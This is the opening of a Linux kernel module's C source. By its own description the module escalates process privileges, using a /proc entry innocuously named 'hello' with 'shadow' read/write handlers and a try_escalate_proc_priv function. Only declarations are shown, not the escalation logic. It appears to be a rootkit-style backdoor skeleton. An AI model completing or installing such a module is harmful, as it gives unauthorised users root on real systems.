#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
// #include <linux/slab.h>
#include <linux/string.h>
// #include <linux/types.h>
#include <asm/uaccess.h>
#include <linux/cred.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Alexander Lopatin");
MODULE_DESCRIPTION("A module for escalate process privilages.");

#define SHADOW_PROC_NAME "hello"
#define MAX_MSG_SIZE 10

static int __init shadow_init(void);
static void __exit shadow_exit(void);

static int create_new_proc_entry(void);
static ssize_t shadow_proc_read(struct file *filp,
			 char *buf,
			 size_t buf_len,
			 loff_t *offp);
static ssize_t shadow_proc_write(struct file *filp,
			  const char *buf,
			  size_t buf_len,
			  loff_t *offp);
static void try_escalate_proc_priv(pid_t pid);

static struct proc_dir_entry *shadow_proc_dir;
static struct file_operations shadow_proc_fops = {
	.owner = THIS_MODULE,
	.read = shadow_proc_read,
	.write = shadow_proc_write
};

